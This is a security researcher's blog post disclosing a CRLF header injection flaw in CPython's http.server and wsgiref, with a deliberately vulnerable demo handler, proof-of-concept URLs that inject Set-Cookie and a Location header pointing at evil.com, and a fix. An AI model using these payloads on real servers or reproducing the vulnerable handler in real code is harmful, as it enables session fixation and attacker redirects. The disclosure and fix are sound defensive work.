---
layout: post
title: "CRLF injection in CPython's http.server and wsgiref"
date: 2026-05-25
author: Yunus Aydın
lang: en
description: "CRLF injection vulnerability in CPython's http.server and wsgiref send_header() allows injecting arbitrary HTTP headers including Set-Cookie and Location when user input is reflected in headers."
keywords: "CRLF injection, CPython, http.server, wsgiref, header injection, session fixation, open redirect, Python security, BaseHTTPRequestHandler, send_header"
canonical_url: "https://aydinnyunus.github.io/2026/05/25/crlf-injection-cpython-http-server-wsgiref/"
---

I found a CRLF injection vulnerability in CPython's standard library — specifically in `http.server` and `wsgiref`. When an application reflects user-controlled input into HTTP headers via `send_header()`, an attacker can terminate the current header and inject arbitrary new ones. The issue was accepted and addressed in PRs [#142605](https://github.com/python/cpython/pull/142605), [#143395](https://github.com/python/cpython/pull/143395), [#148020](https://github.com/python/cpython/pull/148020), and [#148021](https://github.com/python/cpython/pull/148021).

## The vulnerable code

`send_header()` in `Lib/http/server.py` formats and appends header values directly to the output buffer with no validation:

```python
def send_header(self, keyword, value):
    """Send a MIME header to the headers buffer."""
    if self.request_version != 'HTTP/0.9':
        if not hasattr(self, '_headers_buffer'):
            self._headers_buffer = []
        self._headers_buffer.append(
            ("%s: %s\r\n" % (keyword, value)).encode('latin-1', 'strict'))
    # No check for \r or \n in value
```

The `\r\n` at the end of the format string terminates the header. If `value` itself contains `\r\n`, it terminates the header early and everything after it becomes a new header line. That's the injection point.

## Scenario 1: Set-Cookie injection

Here's a minimal application that reflects a query parameter into a custom header:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

class VulnerableHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        custom_val = query.get('val', [''])[0]
        
        self.send_response(200)
        self.send_header('X-Custom', custom_val)
        self.end_headers()
        self.wfile.write(b"Hello World")
```

Normal request: `http://localhost:8000/?val=hello` produces `X-Custom: hello`.

Malicious request:

```
http://localhost:8000/?val=test%0d%0aSet-Cookie:%20pwned=true
```

Resulting HTTP response:

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.x
Date: ...
X-Custom: test
Set-Cookie: pwned=true
```

The `%0d%0a` is URL-encoded `\r\n`. The server split the header, and the attacker's `Set-Cookie` landed as a legitimate header. A browser receiving this will set the `pwned` cookie without any indication that something went wrong.

This enables session fixation: an attacker crafts a link that sets a session cookie they control, sends it to a victim, waits for the victim to log in, then uses the pre-set session ID.

## Scenario 2: Location header injection

Same application, different payload:

```
http://localhost:8000/?val=test%0d%0ALocation:%20http://evil.com/
```

Response:

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.x
Date: ...
X-Custom: test
Location: http://evil.com/
```

The server returned 200 but included a `Location` header pointing to an attacker-controlled site. Depending on how the response is handled downstream — proxies, caches, client libraries — this can trigger unintended redirects without the server ever sending a 3xx status code.

Beyond redirect abuse, injecting headers opens other attack paths:

- **Cache poisoning**: inject `Cache-Control` or `Vary` headers to manipulate what gets stored and served
- **XSS via header reflection**: some frameworks reflect headers into HTML; injecting `Content-Type: text/html` on a response that would otherwise be served as text/plain can enable script execution
- **Web cache deception**: inject headers that instruct caches to store personalized responses

## Why this matters in practice

`http.server` is Python's built-in development server. It's not meant for production, but that warning gets ignored regularly — internal tools, quick demos, admin panels, CI utilities. `wsgiref` is the reference WSGI server and shares the same underlying header-handling code, which means any WSGI application running on it inherits the same issue.

The vulnerability only triggers when user-controlled input reaches `send_header()`. That's an application-level mistake, but it's a common one. Query parameters, `User-Agent` reflection, custom header echoing — these patterns are everywhere in simple HTTP handlers.

The deeper issue: header injection should be handled at the library level, not left to application developers. If `send_header()` strips or rejects `\r` and `\n` characters, the entire class of attacks disappears regardless of how the calling code handles input.

## The fix

The fix validates header values before they're written to the buffer, rejecting any value that contains `\r` or `\n`. This was applied across both `http.server` and `wsgiref` in the linked PRs.

A minimal version of the fix:

```python
def send_header(self, keyword, value):
    """Send a MIME header to the headers buffer."""
    if '\r' in value or '\n' in value:
        raise ValueError(f"Header value {value!r} contains invalid characters")
    if self.request_version != 'HTTP/0.9':
        if not hasattr(self, '_headers_buffer'):
            self._headers_buffer = []
        self._headers_buffer.append(
            ("%s: %s\r\n" % (keyword, value)).encode('latin-1', 'strict'))
```

Same validation applies to the keyword (header name), since injecting a newline there achieves the same result.

## Disclosure

The bug was reported to the CPython project and resulted in four pull requests covering both modules. No CVE was assigned at the time of writing.

- [PR #142605](https://github.com/python/cpython/pull/142605)
- [PR #143395](https://github.com/python/cpython/pull/143395)
- [PR #148020](https://github.com/python/cpython/pull/148020)
- [PR #148021](https://github.com/python/cpython/pull/148021)

## Related content

- [CVE-2026-0560: SSRF in LollMS export content endpoint](https://www.cve.org/CVERecord?id=CVE-2026-0560)
- [SQL Injection Vulnerability: Security Issue in GeoPandas to_postgis() Function](/2025/12/27/sql-injection-geopandas/)
